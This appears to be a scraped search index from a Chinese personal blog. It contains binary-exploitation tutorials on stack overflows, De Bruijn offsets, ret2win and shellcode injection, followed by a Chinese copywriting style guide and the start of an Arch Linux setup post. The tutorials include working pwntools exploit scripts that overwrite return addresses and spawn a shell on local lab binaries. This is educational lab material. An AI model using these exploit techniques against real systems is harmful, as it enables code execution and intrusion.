现在我们需要计算溢出 Padding 。我们将使用 De Bruijn 序列，如上一篇 文章 中所述。 $ pwndbg vuln $ cyclic 500 \u003cCOPY THIS\u003e $ r Overflow me \u003c\u003cPASTE HERE\u003e\u003e Program received signal SIGSEGV, Segmentation fault. 0x64616164 in ?? () [...] $ cyclic -l 0x64616164 Finding cyclic pattern of 4 bytes: b'daad' (hex: 0x64616164) Found at offset 312 得到溢出 Padding 是 312 字节。 ","date":"2023-08-08","objectID":"/shellcode/:3:0","tags":["PWN","Stack"],"title":"shellcode","uri":"/shellcode/"},{"categories":["PWN"],"content":"0x04 编写 EXP 为了使 shellcode 正确，我们将把 context.binary 设置为我们的二进制文件； 这会获取诸如架构、操作系统和位数之类的东西，并使 pwntools 能够为我们提供 shellcode 。 from pwn import * context(os='linux', arch='amd64', log_level='debug') context.binary = ELF('./vuln') p = process() 信息 我们可以只使用 process() ，因为一旦设置了 context.binary 就默认假定 使用该进程。 现在我们可以使用 pwntools 出色的 shellcode 功能轻易的构建 shellcode 。 payload = asm(shellcraft.sh()) # 构建 Shellcode payload = payload.ljust(312, b'A') # 溢出 Padding payload += p32(0xffffd664) # 返回地址 现在让我们将其发送出去并使用 p.interactive() ，它使我们能够与 shell 通信。 p.sendline(payload) p.interactive() 警告 如果你遇到 EOFError ，请打印出 shellcode 并尝试在内存中查找它。 栈地址可能是错误的。 你可以参考这篇 博客 中的 hook 调试方法来解决这个问题。 $ python exp.py [*] 'vuln' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments [+] Starting local process 'vuln': pid 39321 [*] Switching to interactive mode Overflow me $ whoami cub3y0nd ","date":"2023-08-08","objectID":"/shellcode/:4:0","tags":["PWN","Stack"],"title":"shellcode","uri":"/shellcode/"},{"categories":["PWN"],"content":"0x05 最终 EXP from pwn import * context(os='linux', arch='amd64', log_level='info') context.binary = ELF('./vuln') p = process() payload = asm(shellcraft.sh()) payload = payload.ljust(312, b'A') payload += p32(0xffffd664) p.sendline(payload) p.interactive() ","date":"2023-08-08","objectID":"/shellcode/:5:0","tags":["PWN","Stack"],"title":"shellcode","uri":"/shellcode/"},{"categories":["PWN"],"content":"0x06 总结 当提示输入时，我们注入了 shellcode 然后，我们通过覆盖栈上保存的返回地址以指向我们的 shellcode 来劫持代码执行 一旦返回地址压入 EIP 中，它就指向我们的 shellcode 这导致程序执行我们的指令，为我们（在本例中）提供了用于执行 任意命令的 shell ","date":"2023-08-08","objectID":"/shellcode/:6:0","tags":["PWN","Stack"],"title":"shellcode","uri":"/shellcode/"},{"categories":["PWN"],"content":"n 阶 De Bruijn 序列 是一个由 n 个不重复的字符组成的字符串序列。这使得查找 EIP 之前的偏移量变得更加简单：我们只需传入 De Bruijn 序列，获取 EIP 中的值并找到 序列中的 一个可能的匹配 来计算偏移量。这里将在 ret2win 二进制文件上执行此操作。 ret2win.zip /pwn_assets/ret2win.zip ","date":"2023-08-08","objectID":"/de-bruijn-sequences/:0:0","tags":["PWN","Stack"],"title":"德布鲁因（De Bruijn）序列","uri":"/de-bruijn-sequences/"},{"categories":["PWN"],"content":"0x01 生成序列 同样，pwndbg 附带了一个很好的命令行工具（称为 cyclic），可以为我们生成它。 让我们创建一个长度为 100 的序列。 $ cyclic 100 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa 技巧 直接使用 cyclic 将生成默认长度为 100 的序列，指定序列长度可以使用 cyclic \u003ccount\u003e 。 ","date":"2023-08-08","objectID":"/de-bruijn-sequences/:1:0","tags":["PWN","Stack"],"title":"德布鲁因（De Bruijn）序列","uri":"/de-bruijn-sequences/"},{"categories":["PWN"],"content":"0x02 使用序列 现在我们有了序列，让我们在 pwndbg 提示输入时将其输入，使程序崩溃，然后计算 EIP 沿着序列有多远。 $ pwndbg vuln $ r Overflow me aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa $ c [...] Program received signal SIGSEGV, Segmentation fault. 0x6161616e in ?? () [...] 崩溃的地址是 0x6161616e ；我们可以给 cyclic 加上参数 -l \u003clookup_value\u003e 来计算偏移量： $ cyclic -l 0x6161616e Finding cyclic pattern of 4 bytes: b'naaa' (hex: 0x6e616161) Found at offset 52 成功得到了正确的偏移地址！ ","date":"2023-08-08","objectID":"/de-bruijn-sequences/:2:0","tags":["PWN","Stack"],"title":"德布鲁因（De Bruijn）序列","uri":"/de-bruijn-sequences/"},{"categories":["PWN"],"content":"0x03 更为通用的计算方法 这种 cyclic -l 的方法有时候确实可以直接计算出偏移地址，但是有时候也不行。下面 讲一个更加通用的方法： 我们发现：用 cyclic 生成输入到程序中的垃圾数据都是 aaaaaaaa ，baaaaaaa ，caaaaaaa 这样依次类推的。那么想要返回到哪里，其实就只要把溢出点替换为我们的返回地址就好了； 这个引发崩溃的序列（溢出点）之前的输入长度就是偏移量。比如引起崩溃的序列是 haaaaaaa ， 这个子序列在完整的序列中排在第 8 位，说明偏移量占据了 7 个地址。因为 64-bit 系统 一个地址是 8 字节，所以我们可以用 7 * 8 计算得到偏移地址。然后我们就可以在这个 偏移地址后面加上我们的返回地址或者 shellcode 之类的，构成 exploit 了。 另，32-bit 程序的一个地址是 4 字节。 ","date":"2023-08-08","objectID":"/de-bruijn-sequences/:3:0","tags":["PWN","Stack"],"title":"德布鲁因（De Bruijn）序列","uri":"/de-bruijn-sequences/"},{"categories":["PWN"],"content":"ret2win 中有一个 win() 函数（或等效函数）；一旦你成功地将执行重定向到那里， 你就完成了挑战。 为了实现这一点，我们必须覆盖 EIP，但覆盖成我们想要的特定值。 为此，我们需要了解： 直到我们开始覆盖返回地址（EIP）为止的 溢出 Padding 我们想要将 EIP 覆盖成什么值 注意 当我说「覆盖 EIP」时，我的意思是覆盖压入到 EIP 中的已保存的返回地址。 EIP 寄存器 并不位于栈上，因此不会被直接覆盖。 ret2win.zip /pwn_assets/ret2win.zip ","date":"2023-08-07","objectID":"/ret2win/:0:0","tags":["PWN","Stack"],"title":"ret2win","uri":"/ret2win/"},{"categories":["PWN"],"content":"0x01 计算溢出 Padding 这可以通过简单的试验和错误找到。我们可以发送可变数量的字符，将 Segmentation Fault 消息和 pwndbg 结合使用，来判断我们何时覆盖了 EIP 。有一种比简单的暴力破解更好的 方法：德布鲁因（De Bruijn）序列，为了方便起见，现在我们直接使用已经计算出的溢出 Padding。 信息 除了覆盖 EIP 之外，还可能会因其他原因而出现分段错误。使用调试器确保 溢出 Padding 正确。 这里的溢出 Padding 为 52 字节的偏移量。 ","date":"2023-08-07","objectID":"/ret2win/:1:0","tags":["PWN","Stack"],"title":"ret2win","uri":"/ret2win/"},{"categories":["PWN"],"content":"0x02 确定 flag() 函数地址 现在我们需要在二进制文件中找到 flag() 函数的地址，这很简单： $ pwndbg vuln $ i fun [...] 0x080491c3 flag [...] 信息 i fun 代表 info function，可以列出分析中发现的函数。 可以看到这里的 flag() 函数位于 0x080491c3 。 ","date":"2023-08-07","objectID":"/ret2win/:2:0","tags":["PWN","Stack"],"title":"ret2win","uri":"/ret2win/"},{"categories":["PWN"],"content":"0x03 编写地址 最后一个难题是弄清楚如何发送我们想要的地址。在 二进制漏洞利用简介中， 我们发送的 A 变成了 0x41 —— 这是 A 的 ASCII 码 。所以解决方案 很简单——我们只要找到 ASCII 码为 0x08、0x04、0x91 和 0xc3 的 字符即可。 这比你想象的要简单得多，因为我们可以在 Python 中将它们指定为 十六进制： address = '\\x08\\x04\\x91\\xc3' 这使得事情变得容易得多。 技巧 使用 xxd 可以以二进制或十六进制显示文件的内容： ","date":"2023-08-07","objectID":"/ret2win/:3:0","tags":["PWN","Stack"],"title":"ret2win","uri":"/ret2win/"},{"categories":["PWN"],"content":"0x04 编写漏洞利用脚本 现在我们知道了溢出 Padding 和想要覆盖的值，我们可以使用 pwntools 与二进制文件 交互，编写漏洞利用脚本。 from pwn import * context(os='linux', arch='amd64', log_level='debug') # 创建一个新进程 p = process('./vuln') payload = 'A' * 52 payload += '\\x08\\x04\\x91\\xc3' # 输出「Exploited!」字符串则说明我们成功了 p.sendline(payload) p.interactive() 如果你直接运行上面的脚本，就会发现一个小问题：它没有输出 Exploited 。为什么？ 我们可以用调试器来检查一下。添加 hook pwndbg 的代码，以及 pause()，以便 我们可以在想发送 payload 的时候发送 payload 。 from pwn import * context(os='linux', arch='amd64', log_level='debug') context.terminal = ['alacritty', '-e'] p = process('./vuln') # 下面这条指令可以在启动 pwndbg 后自动下断点 # 为了调试程序的问题，我们在 `unsafe` 的 ret 指令返回时设断点 gdb.attach(p, 'b *0x080491aa') payload = 'A' * 52 payload += '\\x08\\x04\\x91\\xc3' pause() p.sendline(payload) p.interactive() 现在让我们使用 python exp.py 运行该脚本，它将自动打开一个 pwndbg 窗口： 让我们在 unsafe() 返回时中断并读取返回地址的值： $ disass unsafe $ c \u003c\u003c press any button on the exploit terminal interface \u003e\u003e $ x/20wx $esp 0xffffd7dc: 0xc3910408 [...] 0xc3910408 ，看起来熟悉吗？这是我们试图发送的地址，只不过字节顺序被反转了， 而这种反转的原因是 字节顺序 使用大端序的系统将最高有效字节（具有最大值的字节） 存储在最小的内存地址处，这就是我们发送它们的方式。使用小端序的系统的做法恰恰相反， 这是有 原因 的，并且我们遇到的大多数二进制文件都是小端序的。就我们而言，只要知道 字节在使用小端序的可执行文件中 payload 以相反的顺序存储 就可以了。 ","date":"2023-08-07","objectID":"/ret2win/:4:0","tags":["PWN","Stack"],"title":"ret2win","uri":"/ret2win/"},{"categories":["PWN"],"content":"0x05 确定字节顺序 pwntools 附带了一个名为 checksec 的工具，用于二进制分析。我们可以直接在 pwndbg 中使用这条指令： $ checksec [...] Arch: i386-32-little [...] 因此可以确定，我们的程序是 32-bit 小端序的。 ","date":"2023-08-07","objectID":"/ret2win/:5:0","tags":["PWN","Stack"],"title":"ret2win","uri":"/ret2win/"},{"categories":["PWN"],"content":"0x06 反转字节顺序 解决方法很简单：反转字节序 payload += '\\x08\\x04\\x91\\xc3'[::-1] 如果你现在运行它，它将成功输出 Exploited! ： $ python exp.py [+] Starting local process './vuln' argv=[b'./vuln'] : pid 9645 [DEBUG] Sent 0x39 bytes: [...] [*] Switching to interactive mode [DEBUG] Received 0x1b bytes: [...] Overflow me Exploited!!!!! 我们已经成功改变了程序的执行流程，调用了 flag() 函数！ ","date":"2023-08-07","objectID":"/ret2win/:6:0","tags":["PWN","Stack"],"title":"ret2win","uri":"/ret2win/"},{"categories":["PWN"],"content":"0x07 Pwntools 和 字节顺序 毫不奇怪，你并不是第一个想到「能否使字节顺序书写变得更简单」的人。 幸运的是，pwntools 有一个内置的 p32() 函数可供使用！ payload += '\\x08\\x04\\x91\\xc3'[::-1] 改为： payload += p32(0x080491c3) 这样就简单多了。唯一需要注意的是它返回字节而不是字符串，因此你必须 将溢出 Padding 设置为字节字符串： payload = b'A' * 52 # 注意 \"b\" 否则你会得到一个这样的报错： TypeError: can only concatenate str (not \"bytes\") to str ","date":"2023-08-07","objectID":"/ret2win/:7:0","tags":["PWN","Stack"],"title":"ret2win","uri":"/ret2win/"},{"categories":["PWN"],"content":"0x08 最终的 Exploit 脚本 from pwn import * context(os='linux', arch='amd64', log_level='debug') p = process('./vuln') payload = b'A' * 52 payload += p32(0x080491c3) p.sendline(payload) p.interactive() ","date":"2023-08-07","objectID":"/ret2win/:8:0","tags":["PWN","Stack"],"title":"ret2win","uri":"/ret2win/"},{"categories":["PWN"],"content":"二进制利用 是指发现程序中的漏洞并利用它们来执行你想要的操作。有时，这可能会导致 绕过身份验证或机密信息泄露，但偶尔（如果幸运的话）它也可能导致远程代码执行（RCE）。 二进制利用的最基本形式发生在 栈 上，栈是存储代码中函数创建的临时变量的内存区域。 当调用一个新函数时，被调用函数的内存地址被压入栈——这样，程序就知道被调用函数 执行完成后应该返回到哪里。让我们看一个基本的二进制文件来展示这一点。 introduction.zip /pwn_assets/introduction.zip ","date":"2023-08-07","objectID":"/stack-introduction/:0:0","tags":["PWN","Stack"],"title":"二进制漏洞利用简介","uri":"/stack-introduction/"},{"categories":["PWN"],"content":"0x01 分析 该压缩包有两个文件 —— source.c 和 vuln ；后者是 ELF 文件，Linux 的 可执行文件格式。 这里将使用 pwndbg 来分析调用函数时二进制文件的行为。 $ pwndbg vuln 我们可以反汇编 main 函数： $ disass main disassemble (disass) 表示反汇编。 0x080491ab \u003c+0\u003e: push ebp 0x080491ac \u003c+1\u003e: mov ebp,esp 0x080491ae \u003c+3\u003e: and esp,0xfffffff0 0x080491b1 \u003c+6\u003e: call 0x80491c3 \u003c__x86.get_pc_thunk.ax\u003e 0x080491b6 \u003c+11\u003e: add eax,0x2e4a 0x080491bb \u003c+16\u003e: call 0x8049172 \u003cunsafe\u003e 0x080491c0 \u003c+21\u003e: nop 0x080491c1 \u003c+22\u003e: leave 0x080491c2 \u003c+23\u003e: ret 对 unsafe 的调用位于 0x080491bb ，我们可以在那里设一个断点： $ b *0x080491bb b 表示 breakpoint，设置断点。断点的作用是在到达时暂停程序的执行以便运行 其它命令。现在我们使用 r 代表 run， 运行程序。这将在遇到我们设置的断点时暂停。 信息 c 代表 continue。作用是继续运行程序，直到遇到断点时暂停。 注意区分 c 和 r 指令的区别，r 指令本身是用来 运行/重启 整个程序的。但 由于有断点存在，所以才会在遇到断点时暂停程序的执行。 它应该在调用 unsafe 之前暂停；现在我们来分析一下栈顶： $ x/20wx $esp 0xffffd740: 0x00000000 [...] 信息 ESP 寄存器 是栈指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个 栈帧的栈顶。 x 指令可以查看内存，具体用法可以自行 Google。 前面的 0xffffd740 表示栈内的位置；0x00000000 是在该位置存储的值。让我们用 s ， step，步入指令，并再次检查栈顶。 $ x/20wx $esp 0xffffd73c: 0x080491c0 [...] 可以发现值 0x080491c0 被压入栈顶，它应该出现在二进制文件中： [...] 0x080491b6 \u003c+11\u003e: add eax,0x2e4a 0x080491bb \u003c+16\u003e: call 0x8049172 \u003cunsafe\u003e 0x080491c0 \u003c+21\u003e: nop [...] 不难发现，这里其实是调用了 unsafe 之后的指令。这说明了程序是如何知道 unsafe() 执行完成后应该返回到哪里的。 ","date":"2023-08-07","objectID":"/stack-introduction/:1:0","tags":["PWN","Stack"],"title":"二进制漏洞利用简介","uri":"/stack-introduction/"},{"categories":["PWN"],"content":"0x02 漏洞 现在让我们看看如何破解这个程序。首先，我们反汇编 unsafe 并在 ret 指令处进行中断； ret 相当于 pop eip ，它将把我们刚才分析的栈上保存的返回地址 0x080491c0 压入 eip 寄存器 中。 信息 EIP 寄存器 用来存储 CPU 要读取的下一条指令的地址，CPU 通过 EIP 寄存器 读取即将要 执行的指令。 每次 CPU 执行完相应的汇编指令后，EIP 寄存器 的值就会增加。 现在让我们继续将一堆字符发送到输入中，看看这会对它有什么影响： $ b *0x080491aa $ r Overflow me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 现在让我们读取返回地址之前所在位置的值： $ x/20wx 0xffffd73c 0xffffd73c: 0x41414141 0x41414141 0x41414141 0x41414141 [...] 我们发现栈上内容全部变成了 0x41414141 ，覆盖了原先的返回地址 0x080491c0 。 原理很简单：由于我们输入的数据比程序预期的要多，这导致我们覆盖的栈也比程序 预期的要多。因为保存的返回地址也在栈上，这意味着我们设法覆盖它。结果，ret 指令本来应该压入 eip 中的值被覆盖，不会在前面的函数中执行，而是执行了 0x41414141 。 我们可以用 s 确认： *EIP 0x41414141 ('AAAA') 下一条将要执行的指令变成了：0x41414141 。我们也可以运行 regs eip 以确保 0x41414141 是 eip 中的值： *EIP 0x41414141 ('AAAA') 我们已经成功劫持了程序的执行流程！让我们试试当我们用 c 继续运行时， 它是否会崩溃。 $ c Continuing. Program received signal SIGSEGV, Segmentation fault. 正如我们所料，程序果然崩溃了。这说明我们成功找到了这个程序的漏洞，并且利用 漏洞破坏了程序的执行流程。 pwndbg 非常有用，它会打印出导致程序崩溃的地址。如果程序崩溃，它通常会显示 「Segmentation fault」。这可能意味着多种情况，但通常是你已经覆盖了 EIP 。 修复 当然，你可以防止人们在使用程序时输入比预期更多的字符，通常使用其他 C 函数 即可解决问题。例如 fgets()；gets() 本质上是不安全的，因为它不检查输入的长度。 你始终应该确保程序中没有使用诸如 gets() 这样危险的函数。你也可能给 fgets() 提供错误的参数，导致它仍然接受太多字符。 ","date":"2023-08-07","objectID":"/stack-introduction/:2:0","tags":["PWN","Stack"],"title":"二进制漏洞利用简介","uri":"/stack-introduction/"},{"categories":["PWN"],"content":"0x03 总结 当一个函数调用另一个函数时： 将返回指针压入栈，以便被调用的函数知道返回到哪里 当被调用函数执行完成时，它再次将其从栈中弹出 因为这个值保存在栈上，就像我们的局部变量一样，如果我们写入的字符比程序预期的多， 我们可以覆盖该值并将代码执行重定向到我们希望的任何地方。fgets() 等函数可以防止 这种简单的溢出，但你始终应该检查程序实际读取了多少内容。 ","date":"2023-08-07","objectID":"/stack-introduction/:3:0","tags":["PWN","Stack"],"title":"二进制漏洞利用简介","uri":"/stack-introduction/"},{"categories":["Blog"],"content":"统一中文文案、排版的相关用法，降低团队成员之间的沟通成本，增强网站气质。 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:0:0","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"空格 引用 「有研究显示，打字的时候不喜欢在中文和英文之间加空格的人，感情路都走得很辛苦， 有七成的比例会在 34 岁的时候跟自己不爱的人结婚，而其余三成的人最后只能把遗产 留给自己的猫。毕竟爱情跟书写都需要适时地留白。 与大家共勉之。」——vinta/paranoid-auto-spacing ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:1:0","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"中英文之间需要增加空格 正确 在 LeanCloud 上，数据存储是围绕 AVObject 进行的。 错误 在LeanCloud上，数据存储是围绕AVObject进行的。 在 LeanCloud上，数据存储是围绕AVObject 进行的。 完整的正确用法 在 LeanCloud 上，数据存储是围绕 AVObject 进行的。每个 AVObject 都包含了 与 JSON 兼容的 key-value 对应的数据。数据是 schema-free 的，你不需要在 每个 AVObject 上提前指定存在哪些键，只要直接设定对应的 key-value 即可。 例外：「豆瓣FM」等产品名词，按照官方所定义的格式书写。 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:1:1","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"中文与数字之间需要增加空格 正确 今天出去买菜花了 5000 元。 错误 今天出去买菜花了 5000元。 今天出去买菜花了5000元。 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:1:2","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"数字与单位之间需要增加空格 正确 我家的光纤入屋宽带有 10 Gbps，SSD 一共有 20 TB 错误 我家的光纤入屋宽带有 10Gbps，SSD 一共有 20TB 例外：度数／百分比与数字之间不需要增加空格： 正确 角度为 90° 的角，就是直角。 新 MacBook Pro 有 15% 的 CPU 性能提升。 错误 角度为 90 ° 的角，就是直角。 新 MacBook Pro 有 15 % 的 CPU 性能提升。 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:1:3","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"全角标点与其他字符之间不加空格 正确 刚刚买了一部 iPhone，好开心！ 错误 刚刚买了一部 iPhone ，好开心！ 刚刚买了一部 iPhone， 好开心！ ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:1:4","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"用 text-spacing 来挽救？ CSS Text Module Level 4 的 text-spacing 和 Microsoft 的 -ms-text-autospace 可以 实现自动为中英文之间增加空白。不过目前并未普及，另外在其他应用场景，例如 macOS、 iOS、Windows 等用户界面目前并不存在这个特性，所以请继续保持随手加空格的习惯。 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:1:5","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"标点符号 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:2:0","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"不重复使用标点符号 虽然中国大陆的标点符号用法允许重复使用标点符号，但是这么做会破坏句子的美观性。 正确 德国队竟然战胜了巴西队！ 她竟然对你说「喵」？！ 错误 德国队竟然战胜了巴西队！！ 德国队竟然战胜了巴西队！！！！！！！！ 她竟然对你说「喵」？？！！ 她竟然对你说「喵」？！？！？？！！ ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:2:1","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"全角和半角 不明白什么是全角（全形）与半角（半形）符号？请查看维基百科条目『全角和半角』。 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:3:0","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"使用全角中文标点 正确 嗨！你知道嘛？今天前台的小妹跟我说「喵」了哎！ 核磁共振成像（NMRI）是什么原理都不知道？JFGI！ 错误 嗨! 你知道嘛? 今天前台的小妹跟我说 “喵” 了哎！ 嗨!你知道嘛?今天前台的小妹跟我说\"喵\"了哎！ 核磁共振成像 (NMRI) 是什么原理都不知道? JFGI! 核磁共振成像(NMRI)是什么原理都不知道?JFGI! 例外：中文句子内夹有英文书籍名、报刊名时，不应借用中文书名号，应以英文斜体表示。 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:3:1","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"数字使用半角字符 正确 这个蛋糕只卖 1000 元。 错误 这个蛋糕只卖 １０００ 元。 例外：在设计稿、宣传海报中如出现极少量数字的情形时，为方便文字对齐，是可以使用 全角数字的。 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:3:2","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"遇到完整的英文整句、特殊名词，其内容使用半角标点 正确 乔布斯那句话是怎么说的？「Stay hungry, stay foolish.」 推荐你阅读 Hackers \u0026 Painters: Big Ideas from the Computer Age，非常地有趣。 错误 乔布斯那句话是怎么说的？「Stay hungry，stay foolish。」 推荐你阅读《Hackers＆Painters：Big Ideas from the Computer Age》，非常的有趣。 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:3:3","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"名词 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:4:0","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"专有名词使用正确的大小写 大小写相关用法原属于英文书写范畴，不属于本 wiki 讨论内容，在这里只对部分易错用法 进行简述。 正确 使用 GitHub 登录 我们的客户有 GitHub、Foursquare、Microsoft Corporation、Google、Facebook, Inc.。 错误 使用 github 登录 使用 GITHUB 登录 使用 Github 登录 使用 gitHub 登录 使用 gｲんĤЦ8 登录 我们的客户有 github、foursquare、microsoft corporation、google、facebook, inc.。 我们的客户有 GITHUB、FOURSQUARE、MICROSOFT CORPORATION、GOOGLE、FACEBOOK, INC.。 我们的客户有 Github、FourSquare、MicroSoft Corporation、Google、FaceBook, Inc.。 我们的客户有 gitHub、fourSquare、microSoft Corporation、google、faceBook, Inc.。 我们的客户有 gｲんĤЦ8、ｷouЯƧquﾑгє、๓เςг๏ร๏Ŧt ς๏гק๏гคtเ๏ภn、900913、ƒ4ᄃëв๏๏к, IПᄃ.。 注意：当网页中需要配合整体视觉风格而出现全部大写／小写的情形，HTML 中请使用标淮的 大小写规范进行书写；并通过 text-transform: uppercase;／text-transform: lowercase; 对表现形式进行定义。 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:4:1","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"不要使用不地道的缩写 正确 我们需要一位熟悉 TypeScript、HTML5，至少理解一种框架（如 React、Next.js）的 前端开发者。 错误 我们需要一位熟悉 Ts、h5，至少理解一种框架（如 RJS、nextjs）的 FED。 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:4:2","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"争议 以下用法略带有个人色彩，即：无论是否遵循下述规则，从语法的角度来讲都是正确的。 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:5:0","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"链接之间增加空格 用法 请 提交一个 issue 并分配给相关同事。 访问我们网站的最新动态，请 点击这里 进行订阅！ 对比用法 请提交一个 issue并分配给相关同事。 访问我们网站的最新动态，请点击这里进行订阅！ ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:5:1","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"简体中文使用直角引号 用法 「老师，『有条不紊』的『紊』是什么意思？」 对比用法 “老师，‘有条不紊’的‘紊’是什么意思？” ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:5:2","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"工具 仓库 系列 语言 pangu.js pangu JavaScript pangu-go pangu Go pangu.java pangu Java pangu.py pangu Python pangu.rb pangu Ruby pangu.php pangu PHP pangu.vim pangu Vim vue-pangu pangu Vue.js (Web Converter) intellij-pangu pangu Intellij Platform Plugin autocorrect autocorrect Rust, WASM, CLI tool autocorrect-node autocorrect Node.js autocorrect-py autocorrect Python autocorrect-rb autocorrect Ruby autocorrect-java autocorrect Java autocorrect-go autocorrect Go autocorrect-php autocorrect PHP autocorrect-vscode autocorrect VS Code Extension autocorrect-idea-plugin autocorrect Intellij Platform Plugin jxlwqq/chinese-typesetting other PHP sparanoid/space-lover other PHP (WordPress) sparanoid/grunt-auto-spacing other Node.js (Grunt) hjiang/scripts/add-space-between-latin-and-cjk other Python hustcc/hint other Python n0vad3v/Tekorrect other Python ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:6:0","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"谁在这样做？ 网站 文案 UGC Apple 中国 是 N/A Apple 香港 是 N/A Apple 台湾 是 N/A Microsoft 中国 是 N/A Microsoft 香港 是 N/A Microsoft 台湾 是 N/A LeanCloud 是 N/A V2EX 是 是 Apple4us 是 N/A Ruby China 是 是 少数派 是 N/A ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:7:0","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"参考文献 Guidelines for Using Capital Letters - ThoughtCo. Letter case - Wikipedia Punctuation - Oxford Dictionaries Punctuation - The Purdue OWL How to Use English Punctuation Correctly - wikiHow 格式 - openSUSE 全形和半形 - 维基百科 引号 - 维基百科 疑问惊叹号 - 维基百科 ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:8:0","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":["Blog"],"content":"Forks 衍生项目的用法可能与本项目存在差异。 mzlogin/chinese-copywriting-guidelines ","date":"2023-08-06","objectID":"/chinese-copywriting-guidelines/:9:0","tags":["Blog"],"title":"中文文案排版指北","uri":"/chinese-copywriting-guidelines/"},{"categories":null,"content":" ID: CuB3y0nd PWNER TEAM: NO TEAM :( E-Mail: root@cubeyond.net GitHub: CuB3y0nd ","date":"2023-08-05","objectID":"/about/:0:0","tags":null,"title":"关于我","uri":"/about/"},{"categories":["Arch Linux"],"content":"首先 flex 一下成品图 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:1:0","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"分区方案规划 首先确定你要给 Arch Linux 划分多少内存。因为我电脑里是一块 1TB 的硬盘， 所以我分了 512GB 给它，剩下的都留着给 Windows 用。 一个比较通用的方案是分以下三个区： EFI 分区：/efi 800MB 根分区：/ 100GB 用户主目录：/home 剩余全部 我设想的 Linux 分区方案如下： 4GB EFI 200GB root 300GB home 8GB swap swap 分区 虽然不一定用得上，但是个人建议分一下。一般设置为 RAM 的一半。 不想给那么多的也可以直接给 2GB。 因为某些原因，我给 EFI 分区 4GB，实际上这个分区使用 800MB 即可。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:2:0","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"确认 EFI 分区 大小 首先要确认 Windows 的 EFI 分区 大小是多少。如果你是 Win 10/Win 11， 按 Win + X 打开 